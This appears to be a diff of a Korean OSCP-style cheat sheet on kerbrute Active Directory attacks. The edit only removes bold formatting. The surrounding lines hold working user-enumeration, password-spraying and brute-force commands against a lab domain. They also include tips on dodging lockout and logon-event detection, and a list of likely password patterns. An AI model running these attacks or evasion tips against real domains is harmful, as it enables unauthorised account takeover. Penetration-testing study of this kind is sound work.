@@ -30,7 +30,7 @@ sudo mv kerbrute /usr/local/bin/
 ./kerbrute userenum --dc 10.10.10.175 -d megacorp.local -t 1 --delay 500 users.txt
 ```
 
-❗ **결과 해석**: `[+]` = 계정 존재, `[-]` = 없음, `[!]` = Pre-Auth 필요 없음(ASREProast 가능)
+❗ 결과 해석: `[+]` = 계정 존재, `[-]` = 없음, `[!]` = Pre-Auth 필요 없음(ASREProast 가능)
 
 ### 2. PasswordSpray - 패스워드 스프레이 공격
 
@@ -51,7 +51,7 @@ sudo mv kerbrute /usr/local/bin/
 ./kerbrute passwordspray --dc 10.10.10.175 -d megacorp.local -o valid_creds.txt found_users.txt 'Password123!'
 ```
 
-❗ **이점**: 일반 로그인(4625)이 아닌 TGT요청(4768)으로 기록 → 계정 잠금 정책 우회 용이
+❗ 이점: 일반 로그인(4625)이 아닌 TGT요청(4768)으로 기록 → 계정 잠금 정책 우회 용이
 
 ### 3. Bruteforce - 특정 사용자 패스워드 공격
 
@@ -74,7 +74,7 @@ EOF
 ./kerbrute bruteforce --dc 10.10.10.175 -d megacorp.local likely_passwords.txt administrator
 ```
 
-❗ **주의**: 브루트포스는 계정 잠금 정책 트리거 가능성 높음 → 소규모/정확한 리스트 사용
+❗ 주의: 브루트포스는 계정 잠금 정책 트리거 가능성 높음 → 소규모/정확한 리스트 사용
 
 ### 4. Combo - 사용자:패스워드 조합 시도
 
@@ -190,7 +190,7 @@ getTGT.py -dc-ip 10.10.10.175 megacorp.local/$user:"$pass"
 
 ## OSCP 시험 주의사항
 
-❗ **중요 팁**:
+❗ 중요 팁:
 
 - 계정 잠금 정책은 보통 5-10회 실패 시 30분 잠김 → `--safe` + `-t 1` + `--delay 1000` 사용
 - 비밀번호 패턴: `회사명+123!`, `계절+년도!`, `Welcome1` 시도 (가장 성공률 높음)
